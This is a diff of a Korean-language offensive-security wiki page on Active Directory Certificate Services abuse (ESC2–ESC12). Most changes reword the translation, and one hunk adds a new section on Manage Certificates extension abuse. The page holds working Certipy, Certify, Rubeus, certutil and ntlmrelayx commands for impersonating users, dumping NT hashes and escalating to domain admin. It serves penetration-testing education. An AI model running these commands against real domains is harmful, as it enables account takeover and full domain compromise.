@@ -67,7 +67,7 @@ AD 포리스트의 구성 스키마 내에서 인증서 템플릿을 열거하�
 
 **Any Purpose EKU**는 공격자가 **어떤 목적**으로든 인증서를 얻을 수 있도록 허용하며, 여기에는 클라이언트 인증, 서버 인증, 코드 서명 등이 포함됩니다. **ESC3에 사용된 동일한 기술**을 사용하여 이 시나리오를 악용할 수 있습니다.
 
-**EKU가 없는** 인증서는 하위 CA 인증서로 작용하며, **어떤 목적**으로든 악용될 수 있으며 **새로운 인증서에 서명하는 데에도 사용될 수 있습니다**. 따라서 공격자는 하위 CA 인증서를 활용하여 새로운 인증서에 임의의 EKU 또는 필드를 지정할 수 있습니다.
+**EKU가 없는** 인증서는 하위 CA 인증서로 작용하며, **어떤 목적**으로든 악용될 수 있으며 **새로운 인증서를 서명하는 데에도 사용될 수 있습니다**. 따라서 공격자는 하위 CA 인증서를 활용하여 새로운 인증서에 임의의 EKU 또는 필드를 지정할 수 있습니다.
 
 그러나 **도메인 인증**을 위해 생성된 새로운 인증서는 하위 CA가 **`NTAuthCertificates`** 객체에 의해 신뢰되지 않는 경우 작동하지 않습니다. 이는 기본 설정입니다. 그럼에도 불구하고 공격자는 여전히 **임의의 EKU**와 임의의 인증서 값을 가진 **새로운 인증서**를 생성할 수 있습니다. 이러한 인증서는 잠재적으로 **다양한 목적**(예: 코드 서명, 서버 인증 등)으로 악용될 수 있으며, SAML, AD FS 또는 IPSec과 같은 네트워크의 다른 애플리케이션에 중대한 영향을 미칠 수 있습니다.
 
@@ -79,26 +79,26 @@ AD Forest의 구성 스키마 내에서 이 시나리오와 일치하는 템플�
 
 ### 설명
 
-이 시나리오는 첫 번째와 두 번째와 비슷하지만 **다른 EKU**(Certificate Request Agent)를 **악용**하고 **2개의 다른 템플릿**을 사용합니다(따라서 2세트의 요구 사항이 있습니다).
+이 시나리오는 첫 번째와 두 번째와 비슷하지만 **다른 EKU**(인증서 요청 에이전트)를 **악용**하고 **2개의 다른 템플릿**을 사용합니다(따라서 2세트의 요구 사항이 있습니다).
 
-**Certificate Request Agent EKU**(OID 1.3.6.1.4.1.311.20.2.1)는 Microsoft 문서에서 **Enrollment Agent**로 알려져 있으며, 주체가 **다른 사용자**를 대신하여 **인증서**에 **등록**할 수 있도록 허용합니다.
+**인증서 요청 에이전트 EKU**(OID 1.3.6.1.4.1.311.20.2.1)는 Microsoft 문서에서 **등록 에이전트**로 알려져 있으며, 주체가 **다른 사용자를 대신하여 인증서**에 **등록**할 수 있도록 허용합니다.
 
-**“등록 에이전트”**는 그러한 **템플릿**에 등록하고 결과적으로 **다른 사용자를 대신하여 CSR에 공동 서명**하는 데 사용되는 **인증서**를 사용합니다. 그런 다음 **공동 서명된 CSR**을 CA에 **전송**하고, **“대신 등록”을 허용하는** 템플릿에 등록하며, CA는 **“다른” 사용자에게 속하는 인증서**로 응답합니다.
+**“등록 에이전트”**는 그러한 **템플릿**에 등록하고 결과적으로 생성된 **인증서를 사용하여 다른 사용자를 대신하여 CSR에 공동 서명**합니다. 그런 다음 **공동 서명된 CSR**을 CA에 **전송**하고, **“대신 등록”을 허용하는 템플릿**에 등록하며, CA는 **“다른” 사용자에게 속하는 인증서**로 응답합니다.
 
 **요구 사항 1:**
 
-- 등록 권한이 엔터프라이즈 CA에 의해 낮은 권한의 사용자에게 부여됩니다.
+- 엔터프라이즈 CA에 의해 저권한 사용자에게 등록 권한이 부여됩니다.
 - 관리자 승인 요구 사항이 생략됩니다.
 - 승인된 서명에 대한 요구 사항이 없습니다.
-- 인증서 템플릿의 보안 설명자가 지나치게 관대하여 낮은 권한의 사용자에게 등록 권한을 부여합니다.
-- 인증서 템플릿에는 Certificate Request Agent EKU가 포함되어 있어 다른 주체를 대신하여 다른 인증서 템플릿을 요청할 수 있습니다.
+- 인증서 템플릿의 보안 설명자는 지나치게 관대하여 저권한 사용자에게 등록 권한을 부여합니다.
+- 인증서 템플릿에는 인증서 요청 에이전트 EKU가 포함되어 있어 다른 주체를 대신하여 다른 인증서 템플릿을 요청할 수 있습니다.
 
 **요구 사항 2:**
 
-- 엔터프라이즈 CA는 낮은 권한의 사용자에게 등록 권한을 부여합니다.
+- 엔터프라이즈 CA는 저권한 사용자에게 등록 권한을 부여합니다.
 - 관리자 승인이 우회됩니다.
-- 템플릿의 스키마 버전이 1이거나 2를 초과하며, Certificate Request Agent EKU를 필요로 하는 애플리케이션 정책 발급 요구 사항을 지정합니다.
-- 인증서 템플릿에 정의된 EKU가 도메인 인증을 허용합니다.
+- 템플릿의 스키마 버전은 1이거나 2를 초과하며, 인증서 요청 에이전트 EKU를 필요로 하는 애플리케이션 정책 발급 요구 사항을 지정합니다.
+- 인증서 템플릿에 정의된 EKU는 도메인 인증을 허용합니다.
 - CA에서 등록 에이전트에 대한 제한이 적용되지 않습니다.
 
 ### 악용
@@ -117,7 +117,7 @@ certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.loca
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
-허용된 **사용자**는 **등록 에이전트 인증서**를 **획득**할 수 있으며, 등록 **에이전트**가 등록할 수 있는 템플릿과 등록 에이전트가 대신하여 행동할 수 있는 **계정**은 엔터프라이즈 CA에 의해 제한될 수 있습니다. 이는 `certsrc.msc` **스냅인**을 열고, **CA를 마우스 오른쪽 버튼으로 클릭**한 다음, **속성 클릭** 후 “Enrollment Agents” 탭으로 **이동**하여 달성됩니다.
+허용된 **사용자**는 **등록 에이전트 인증서**를 **획득**할 수 있으며, 등록 **에이전트**가 등록할 수 있는 템플릿과 등록 에이전트가 대신하여 행동할 수 있는 **계정**은 엔터프라이즈 CA에 의해 제한될 수 있습니다. 이는 `certsrc.msc` **스냅인**을 열고, **CA를 마우스 오른쪽 버튼으로 클릭**한 후, **속성 클릭** 및 “등록 에이전트” 탭으로 **탐색**하여 달성됩니다.
 
 그러나 CA의 **기본** 설정은 “**등록 에이전트를 제한하지 않음**”으로 설정되어 있음을 주목해야 합니다. 관리자가 등록 에이전트에 대한 제한을 활성화하면 “등록 에이전트를 제한”으로 설정하더라도 기본 구성은 여전히 매우 관대합니다. 이는 **모든 사람**이 누구로든 모든 템플릿에 등록할 수 있도록 허용합니다.
 
@@ -127,14 +127,14 @@ Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password
 
 **인증서 템플릿**에 대한 **보안 설명자**는 템플릿에 대해 특정 **AD 주체**가 보유한 **권한**을 정의합니다.
 
-**공격자**가 **템플릿**을 **변경**하고 **이전 섹션**에서 설명한 **악용 가능한 잘못된 구성**을 **설치**할 수 있는 필수 **권한**을 보유하고 있다면, 권한 상승이 촉진될 수 있습니다.
+**공격자**가 **템플릿**을 **변경**하고 **이전 섹션**에 설명된 **악용 가능한 잘못된 구성**을 **설치**할 수 있는 필수 **권한**을 보유하고 있다면, 권한 상승이 촉진될 수 있습니다.
 
 인증서 템플릿에 적용 가능한 주목할 만한 권한은 다음과 같습니다:
 
-- **소유자:** 객체에 대한 암묵적인 제어를 부여하여 모든 속성을 수정할 수 있게 합니다.
+- **소유자:** 객체에 대한 암묵적인 제어를 부여하여 모든 속성을 수정할 수 있습니다.
 - **전체 제어:** 객체에 대한 완전한 권한을 부여하며, 모든 속성을 변경할 수 있는 능력을 포함합니다.
-- **소유자 쓰기:** 객체의 소유자를 공격자가 제어하는 주체로 변경할 수 있게 허용합니다.
-- **DACL 쓰기:** 접근 제어를 조정할 수 있게 하여 공격자에게 전체 제어를 부여할 수 있습니다.
+- **소유자 쓰기:** 객체의 소유자를 공격자가 제어하는 주체로 변경할 수 있습니다.
+- **DACL 쓰기:** 접근 제어를 조정할 수 있으며, 공격자에게 전체 제어를 부여할 수 있습니다.
 - **속성 쓰기:** 모든 객체 속성을 편집할 수 있는 권한을 부여합니다.
 
 ### 남용
@@ -143,13 +143,13 @@ Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password
 
 <figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>
 
-ESC4는 사용자가 인증서 템플릿에 대한 쓰기 권한을 가질 때 발생합니다. 예를 들어, 이는 인증서 템플릿의 구성을 덮어써서 ESC1에 취약하도록 만들기 위해 악용될 수 있습니다.
+ESC4는 사용자가 인증서 템플릿에 대한 쓰기 권한을 가질 때 발생합니다. 예를 들어, 이는 인증서 템플릿의 구성을 덮어써서 템플릿을 ESC1에 취약하게 만들기 위해 악용될 수 있습니다.
 
 위 경로에서 볼 수 있듯이, 오직 `JOHNPC`만 이러한 권한을 가지고 있지만, 우리의 사용자 `JOHN`은 `JOHNPC`에 대한 새로운 `AddKeyCredentialLink` 엣지를 가지고 있습니다. 이 기술이 인증서와 관련이 있기 때문에, 저는 이 공격을 구현했습니다. 이는 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로 알려져 있습니다. 피해자의 NT 해시를 검색하기 위한 Certipy의 `shadow auto` 명령의 작은 미리 보기를 보여드립니다.
 ```bash
 certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
 ```
-**Certipy**는 단일 명령으로 인증서 템플릿의 구성을 덮어쓸 수 있습니다. **기본적으로**, Certipy는 구성을 **ESC1에 취약하도록 덮어씁니다**. 또한 **`-save-old` 매개변수를 지정하여 이전 구성을 저장할 수 있으며**, 이는 공격 후 구성을 **복원하는 데 유용**할 것입니다.
+**Certipy**는 단일 명령으로 인증서 템플릿의 구성을 덮어쓸 수 있습니다. **기본적으로** Certipy는 구성을 **ESC1에 취약하도록 덮어씁니다**. 또한 **구성을 복원하는 데 유용할** **`-save-old` 매개변수를 지정할 수 있습니다**.
 ```bash
 # Make template vuln to ESC1
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
@@ -170,15 +170,15 @@ certipy template -username john@corp.local -password Passw0rd -template ESC4-Tes
 - CA 서버의 RPC/DCOM 서버.
 - 특정 컨테이너 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 모든 하위 AD 객체 또는 컨테이너. 이 경로에는 인증서 템플릿 컨테이너, 인증 기관 컨테이너, NTAuthCertificates 객체 및 등록 서비스 컨테이너와 같은 컨테이너 및 객체가 포함되지만 이에 국한되지 않습니다.
 
-저급 권한의 공격자가 이러한 중요한 구성 요소 중 하나를 제어하게 되면 PKI 시스템의 보안이 손상될 수 있습니다.
+저권한 공격자가 이러한 중요한 구성 요소 중 하나를 제어하게 되면 PKI 시스템의 보안이 손상될 수 있습니다.
 
 ## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
 
 ### Explanation
 
-[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage)에서 논의된 주제는 Microsoft에서 설명한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 의미를 다룹니다. 이 구성은 인증 기관(CA)에서 활성화되면 **사용자 정의 값**을 **주체 대체 이름**에 포함할 수 있도록 허용합니다. 이는 Active Directory®에서 구성된 요청을 포함하여 **모든 요청**에 해당합니다. 결과적으로, 이 조항은 **침입자**가 도메인 **인증**을 위해 설정된 **모든 템플릿**을 통해 등록할 수 있도록 하며, 특히 표준 사용자 템플릿과 같이 **비권한** 사용자 등록이 가능한 템플릿에 해당합니다. 그 결과, 인증서를 확보하여 침입자가 도메인 관리자 또는 도메인 내의 **다른 활성 엔티티**로 인증할 수 있게 됩니다.
+[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage)에서 논의된 주제는 Microsoft에서 설명한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 의미를 다룹니다. 이 구성은 인증 기관(CA)에서 활성화되면 **사용자 정의 값**을 **주체 대체 이름**에 포함할 수 있도록 허용합니다. 이는 Active Directory®에서 구성된 요청을 포함하여 **모든 요청**에 해당합니다. 결과적으로, 이 조항은 **침입자**가 도메인 **인증**을 위해 설정된 **모든 템플릿**을 통해 등록할 수 있도록 하며, 특히 표준 사용자 템플릿과 같이 **저권한** 사용자 등록이 가능한 템플릿에 해당합니다. 그 결과, 인증서를 확보하여 침입자가 도메인 관리자 또는 도메인 내의 **다른 활성 엔티티**로 인증할 수 있게 됩니다.
 
-**Note**: `certreq.exe`에서 `-attrib "SAN:"` 인수를 통해 인증서 서명 요청(CSR)에 **대체 이름**을 추가하는 방법은 ESC1의 SAN 악용 전략과 **대조**를 이룹니다. 여기서의 차이는 **계정 정보가 캡슐화되는 방식**에 있으며, 확장 대신 인증서 속성 내에 포함됩니다.
+**Note**: `certreq.exe`에서 `-attrib "SAN:"` 인수를 통해 인증서 서명 요청(CSR)에 **대체 이름**을 추가하는 방법은 ESC1의 SANs 악용 전략과 **대조적**입니다. 여기서의 차이는 **계정 정보가 캡슐화되는 방식**에 있으며, 확장이 아닌 인증서 속성 내에 포함됩니다.
 
 ### Abuse
 
@@ -208,10 +208,10 @@ certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJ
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
 > [!WARNING]
-> 2022년 5월 보안 업데이트 이후, 새로 발급된 **certificates**는 **requester's `objectSid` property**를 포함하는 **security extension**을 포함합니다. ESC1의 경우, 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우, SID는 **requester's `objectSid`**를 반영하며, SAN은 반영하지 않습니다.\
-> ESC6를 악용하기 위해서는 시스템이 ESC10(Weak Certificate Mappings)에 취약해야 하며, 이는 **새로운 security extension보다 SAN을 우선시**합니다.
+> 2022년 5월 보안 업데이트 이후, 새로 발급된 **certificates**는 **requester's `objectSid` property**를 포함하는 **security extension**을 포함합니다. ESC1의 경우, 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우, SID는 **requester's `objectSid`**를 반영하며, SAN이 아닙니다.\
+> ESC6를 악용하기 위해서는 시스템이 ESC10(Weak Certificate Mappings)에 취약해야 하며, 이는 **새로운 security extension**보다 **SAN**을 우선시합니다.
 
-## 취약한 Certificate Authority 접근 제어 - ESC7
+## 취약한 Certificate Authority Access Control - ESC7
 
 ### 공격 1
 
@@ -285,7 +285,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully enabled 'SubCA' on 'corp-DC-CA'
 ```
-이 공격을 위한 전제 조건을 충족했다면, **`SubCA` 템플릿을 기반으로 인증서를 요청하는 것**부터 시작할 수 있습니다.
+이 공격을 위한 전제 조건을 충족했다면, **`SubCA` 템플릿을 기반으로 인증서를 요청하는 것부터 시작할 수 있습니다**.
 
 **이 요청은 거부될 것입니다**, 하지만 우리는 개인 키를 저장하고 요청 ID를 기록해 두겠습니다.
 ```bash
@@ -299,7 +299,7 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-우리의 **`Manage CA` 및 `Manage Certificates`**를 사용하여 `ca` 명령과 `-issue-request <request ID>` 매개변수를 사용하여 **실패한 인증서** 요청을 **발급**할 수 있습니다.
+우리의 **`Manage CA` 및 `Manage Certificates`**를 사용하여 **실패한 인증서** 요청을 `ca` 명령과 `-issue-request <request ID>` 매개변수로 발급할 수 있습니다.
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -318,27 +318,67 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '785.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
+### Attack 3 – Manage Certificates Extension Abuse (SetExtension)
+
+#### Explanation
+
+고전적인 ESC7 남용(EDITF 속성 활성화 또는 보류 중인 요청 승인) 외에도, **Certify 2.0**은 *Manage Certificates* (일명 **Certificate Manager / Officer**) 역할만 필요로 하는 새로운 원시 기능을 공개했습니다.
+
+`ICertAdmin::SetExtension` RPC 메서드는 *Manage Certificates*를 보유한 모든 주체에 의해 실행될 수 있습니다. 이 메서드는 전통적으로 합법적인 CA가 **보류 중인** 요청의 확장을 업데이트하는 데 사용되었지만, 공격자는 이를 악용하여 **비기본* 인증서 확장**(예: `1.1.1.1`과 같은 사용자 정의 *Certificate Issuance Policy* OID)을 승인 대기 중인 요청에 추가할 수 있습니다.
+
+대상 템플릿이 **해당 확장에 대한 기본값을 정의하지 않기 때문에**, 요청이 결국 발급될 때 CA는 공격자가 제어하는 값을 덮어쓰지 않습니다. 따라서 결과 인증서는 공격자가 선택한 확장을 포함하게 되며, 이는 다음과 같은 결과를 초래할 수 있습니다:
+
+* 다른 취약한 템플릿의 애플리케이션 / 발급 정책 요구 사항을 충족시킴(권한 상승으로 이어짐).
+* 인증서가 제3자 시스템에서 예상치 못한 신뢰를 부여하는 추가 EKU 또는 정책을 주입함.
+
+요약하자면, *Manage Certificates*는 이전에 ESC7의 “덜 강력한” 절반으로 간주되었으나, 이제 CA 구성에 손대지 않고 더 제한적인 *Manage CA* 권한을 요구하지 않으면서 전체 권한 상승 또는 장기 지속성을 위해 활용될 수 있습니다.
+
+#### Abusing the primitive with Certify 2.0
+
+1. **보류 중인 인증서 요청을 제출합니다.** 이는 관리자 승인이 필요한 템플릿으로 강제할 수 있습니다:
+```powershell
+Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
+# 반환된 요청 ID를 기록해 두십시오.
+```
+
+2. **새로운 `manage-ca` 명령을 사용하여 보류 중인 요청에 사용자 정의 확장을 추가합니다:**
+```powershell
+Certify.exe manage-ca --ca SERVER\\CA-NAME \
+--request-id 1337 \
+--set-extension "1.1.1.1=DER,10,01 01 00 00"  # 가짜 발급 정책 OID
+```
+*템플릿이 이미 *Certificate Issuance Policies* 확장을 정의하지 않았다면, 위의 값은 발급 후에도 유지됩니다.*
+
+3. **요청을 발급합니다** (역할에 *Manage Certificates* 승인 권한이 있는 경우) 또는 운영자가 승인할 때까지 기다립니다. 발급된 후 인증서를 다운로드합니다:
+```powershell
+Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
+```
+
+4. 결과 인증서는 이제 악성 발급 정책 OID를 포함하고 있으며, 이후 공격(예: ESC13, 도메인 상승 등)에 사용될 수 있습니다.
+
+> NOTE: 동일한 공격은 Certipy ≥ 4.7을 통해 `ca` 명령과 `-set-extension` 매개변수를 사용하여 실행할 수 있습니다.
+
 ## NTLM Relay to AD CS HTTP Endpoints – ESC8
 
 ### Explanation
 
 > [!TIP]
-> **AD CS가 설치된** 환경에서, **취약한 웹 등록 엔드포인트**가 존재하고 **도메인 컴퓨터 등록 및 클라이언트 인증**을 허용하는 **인증서 템플릿이 게시**된 경우(예: 기본 **`Machine`** 템플릿), **스풀러 서비스가 활성화된 모든 컴퓨터가 공격자에 의해 손상될 수 있습니다**!
+> **AD CS가 설치된** 환경에서, **웹 등록 엔드포인트가 취약**하고 적어도 하나의 **인증서 템플릿이 게시**되어 **도메인 컴퓨터 등록 및 클라이언트 인증**을 허용하는 경우(기본 **`Machine`** 템플릿과 같은), **스풀러 서비스가 활성화된 모든 컴퓨터가 공격자에 의해 손상될 수 있는 가능성이 있습니다**!
 
-AD CS는 관리자가 설치할 수 있는 추가 서버 역할을 통해 제공되는 여러 **HTTP 기반 등록 방법**을 지원합니다. HTTP 기반 인증서 등록을 위한 이러한 인터페이스는 **NTLM 릴레이 공격**에 취약합니다. 공격자는 **손상된 머신에서, 인바운드 NTLM을 통해 인증하는 모든 AD 계정을 가장할 수 있습니다**. 피해자 계정을 가장하는 동안, 공격자는 이러한 웹 인터페이스에 접근하여 **`User` 또는 `Machine` 인증서 템플릿을 사용하여 클라이언트 인증서 요청**을 할 수 있습니다.
+여러 **HTTP 기반 등록 방법**이 AD CS에 의해 지원되며, 관리자가 설치할 수 있는 추가 서버 역할을 통해 제공됩니다. 이러한 HTTP 기반 인증서 등록 인터페이스는 **NTLM 릴레이 공격**에 취약합니다. 공격자는 **손상된 머신에서, 인바운드 NTLM을 통해 인증하는 모든 AD 계정을 가장할 수 있습니다**. 피해자 계정을 가장하는 동안, 이러한 웹 인터페이스에 접근하여 **`User` 또는 `Machine` 인증서 템플릿을 사용하여 클라이언트 인증서 요청**을 할 수 있습니다.
 
-- **웹 등록 인터페이스**(`http://<caserver>/certsrv/`에서 사용할 수 있는 오래된 ASP 애플리케이션)는 기본적으로 HTTP만 지원하며, NTLM 릴레이 공격에 대한 보호를 제공하지 않습니다. 또한, Authorization HTTP 헤더를 통해 NTLM 인증만 명시적으로 허용하여 Kerberos와 같은 더 안전한 인증 방법을 적용할 수 없게 만듭니다.
-- **인증서 등록 서비스**(CES), **인증서 등록 정책**(CEP) 웹 서비스 및 **네트워크 장치 등록 서비스**(NDES)는 기본적으로 Authorization HTTP 헤더를 통해 협상 인증을 지원합니다. 협상 인증은 **Kerberos와 NTLM**을 모두 지원하여 공격자가 릴레이 공격 중 NTLM 인증으로 **다운그레이드**할 수 있게 합니다. 이러한 웹 서비스는 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 **NTLM 릴레이 공격으로부터 보호되지 않습니다**. HTTPS 서비스에 대한 NTLM 릴레이 공격으로부터의 보호는 HTTPS가 채널 바인딩과 결합될 때만 가능합니다. 불행히도, AD CS는 IIS에서 인증에 대한 확장 보호를 활성화하지 않으며, 이는 채널 바인딩에 필요합니다.
+- **웹 등록 인터페이스**(기본적으로 `http://<caserver>/certsrv/`에서 사용할 수 있는 오래된 ASP 애플리케이션)는 기본적으로 HTTP만 지원하며, NTLM 릴레이 공격에 대한 보호를 제공하지 않습니다. 또한, Authorization HTTP 헤더를 통해 NTLM 인증만을 명시적으로 허용하여 Kerberos와 같은 더 안전한 인증 방법을 적용할 수 없게 만듭니다.
+- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) 웹 서비스 및 **Network Device Enrollment Service** (NDES)는 기본적으로 Authorization HTTP 헤더를 통해 협상 인증을 지원합니다. 협상 인증은 **Kerberos와 NTLM**을 모두 지원하여 공격자가 릴레이 공격 중 NTLM 인증으로 **다운그레이드**할 수 있게 합니다. 이러한 웹 서비스는 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 NTLM 릴레이 공격으로부터 보호되지 않습니다. HTTPS 서비스에 대한 NTLM 릴레이 공격으로부터의 보호는 HTTPS와 채널 바인딩이 결합될 때만 가능합니다. 불행히도, AD CS는 IIS에서 인증에 대한 확장 보호를 활성화하지 않으며, 이는 채널 바인딩에 필요합니다.
 
-NTLM 릴레이 공격의 일반적인 **문제**는 **NTLM 세션의 짧은 지속 시간**과 공격자가 **NTLM 서명을 요구하는 서비스와 상호작용할 수 없는** 것입니다.
+NTLM 릴레이 공격의 일반적인 **문제**는 **NTLM 세션의 짧은 지속 시간**과 **NTLM 서명을 요구하는 서비스와 상호작용할 수 없는 공격자의 능력**입니다.
 
-그럼에도 불구하고, 이 제한은 NTLM 릴레이 공격을 이용하여 사용자의 인증서를 획득함으로써 극복됩니다. 인증서의 유효 기간이 세션의 지속 시간을 결정하며, 인증서는 **NTLM 서명을 요구하는 서비스와 함께 사용될 수 있습니다**. 도난당한 인증서를 사용하는 방법에 대한 지침은 다음을 참조하십시오:
+그럼에도 불구하고, 이 제한은 NTLM 릴레이 공격을 이용하여 사용자를 위한 인증서를 획득함으로써 극복됩니다. 인증서의 유효 기간이 세션의 지속 시간을 결정하며, 인증서는 **NTLM 서명을 요구하는 서비스**와 함께 사용될 수 있습니다. 도난당한 인증서를 사용하는 방법에 대한 지침은 다음을 참조하십시오:
 
 {{#ref}}
 account-persistence.md
 {{#endref}}
 
-NTLM 릴레이 공격의 또 다른 제한은 **공격자가 제어하는 머신이 피해자 계정에 의해 인증되어야 한다는 점**입니다. 공격자는 이 인증을 기다리거나 **강제로** 시도할 수 있습니다:
+NTLM 릴레이 공격의 또 다른 제한은 **공격자 제어 머신이 피해자 계정에 의해 인증되어야 한다는 점**입니다. 공격자는 이 인증을 **강제**하거나 기다릴 수 있습니다:
 
 {{#ref}}
 ../printers-spooler-service-abuse.md
@@ -352,7 +392,7 @@ Certify.exe cas
 ```
 <figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>
 
-`msPKI-Enrollment-Servers` 속성은 기업 인증 기관(CA)이 인증서 등록 서비스(CES) 엔드포인트를 저장하는 데 사용됩니다. 이러한 엔드포인트는 **Certutil.exe** 도구를 사용하여 구문 분석하고 나열할 수 있습니다:
+`msPKI-Enrollment-Servers` 속성은 기업 인증 기관(CA)이 인증서 등록 서비스(CES) 엔드포인트를 저장하는 데 사용됩니다. 이러한 엔드포인트는 도구 **Certutil.exe**를 사용하여 구문 분석하고 나열할 수 있습니다:
 ```
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
@@ -432,34 +472,34 @@ certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ES
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-발급된 인증서를 사용하여 인증을 시도하면 이제 `Administrator@corp.local`의 NT 해시가 생성됩니다. 인증서에 도메인 지정이 없기 때문에 명령에는 `-domain <domain>`이 포함되어야 합니다:
+발급된 인증서를 사용하여 인증을 시도하면 이제 `Administrator@corp.local`의 NT 해시가 생성됩니다. 인증서에 도메인 지정이 없기 때문에 명령어에는 `-domain <domain>`이 포함되어야 합니다:
 ```bash
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
-## Weak Certificate Mappings - ESC10
+## 약한 인증서 매핑 - ESC10
 
-### Explanation
+### 설명
 
 도메인 컨트롤러의 두 레지스트리 키 값이 ESC10에 의해 언급됩니다:
 
 - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 아래의 `CertificateMappingMethods`에 대한 기본 값은 `0x18` (`0x8 | 0x10`)이며, 이전에는 `0x1F`로 설정되어 있었습니다.
 - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 아래의 `StrongCertificateBindingEnforcement`에 대한 기본 설정은 `1`이며, 이전에는 `0`이었습니다.
 
-**Case 1**
+**사례 1**
 
 `StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우.
 
-**Case 2**
+**사례 2**
 
 `CertificateMappingMethods`에 `UPN` 비트(`0x4`)가 포함된 경우.
 
-### Abuse Case 1
+### 남용 사례 1
 
-`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우, `GenericWrite` 권한을 가진 계정 A는 계정 B를 손상시키는 데 악용될 수 있습니다.
+`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우, `GenericWrite` 권한을 가진 계정 A는 계정 B를 손상시키기 위해 악용될 수 있습니다.
 
 예를 들어, `Jane@corp.local`에 대한 `GenericWrite` 권한을 가진 공격자는 `Administrator@corp.local`을 손상시키려 합니다. 이 절차는 ESC9와 유사하며, 모든 인증서 템플릿을 사용할 수 있게 합니다.
 
-처음에 `Jane`의 해시는 Shadow Credentials를 사용하여 `GenericWrite`를 악용하여 검색됩니다.
+처음에, `Jane`의 해시는 Shadow Credentials를 사용하여 `GenericWrite`를 악용하여 검색됩니다.
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
@@ -481,7 +521,7 @@ certipy auth -pfx administrator.pfx -domain corp.local
 ```
 ### Abuse Case 2
 
-`CertificateMappingMethods`에 `UPN` 비트 플래그(`0x4`)가 포함되어 있는 경우, `GenericWrite` 권한이 있는 계정 A는 `userPrincipalName` 속성이 없는 모든 계정 B를 손상시킬 수 있으며, 여기에는 머신 계정과 내장 도메인 관리자 `Administrator`가 포함됩니다.
+`CertificateMappingMethods`에 `UPN` 비트 플래그(`0x4`)가 포함된 경우, `GenericWrite` 권한을 가진 계정 A는 `userPrincipalName` 속성이 없는 모든 계정 B를 손상시킬 수 있으며, 여기에는 머신 계정과 내장 도메인 관리자 `Administrator`가 포함됩니다.
 
 여기서 목표는 `Jane`의 해시를 Shadow Credentials를 통해 얻고 `GenericWrite`를 활용하여 `DC$@corp.local`을 손상시키는 것입니다.
 ```bash
@@ -565,7 +605,7 @@ $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -s
 
 관리자는 인증 기관을 "Yubico YubiHSM2"와 같은 외부 장치에 저장하도록 설정할 수 있습니다.
 
-USB 장치가 CA 서버에 USB 포트를 통해 연결되거나 CA 서버가 가상 머신인 경우 USB 장치 서버에 연결된 경우, YubiHSM에서 키를 생성하고 활용하기 위해 Key Storage Provider에 대한 인증 키(때때로 "비밀번호"라고도 함)가 필요합니다.
+USB 장치가 USB 포트를 통해 CA 서버에 연결되거나 CA 서버가 가상 머신인 경우 USB 장치 서버에 연결된 경우, YubiHSM에서 키를 생성하고 활용하기 위해 인증 키(때때로 "비밀번호"라고도 함)가 필요합니다.
 
 이 키/비밀번호는 레지스트리의 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`에 평문으로 저장됩니다.
 
@@ -573,7 +613,7 @@ Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-
 
 ### Abuse Scenario
 
-CA의 개인 키가 물리적 USB 장치에 저장되어 있을 때 쉘 접근을 얻으면 키를 복구할 수 있습니다.
+CA의 개인 키가 물리적 USB 장치에 저장되어 있을 경우, 쉘 접근을 통해 키를 복구할 수 있습니다.
 
 먼저 CA 인증서를 얻어야 합니다(이는 공개적입니다) 그리고:
 ```cmd
